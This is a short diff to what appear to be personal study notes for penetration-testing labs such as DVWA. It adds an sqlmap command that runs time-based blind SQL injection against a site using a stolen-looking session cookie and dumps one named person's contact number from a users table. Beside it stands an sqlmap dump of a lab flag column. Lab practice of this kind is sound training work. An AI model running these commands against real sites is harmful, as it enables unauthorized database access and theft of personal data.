@@ -155,6 +155,9 @@ OS-command injection to retrieve a specific file – dvwa
 -> sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name - T table_name -C Flag --dump 
 
 ------ 
+DelaySQL:
+-> sqlmap -u "http://targetsite.com/item?id=5" --cookie="session=abcdef1234567890" --technique=T --dump -D database_name -T users -C contact_number --where="name='Maria'"
+
 
 now in parrot os, open firefox and login into the website given and details. 
 
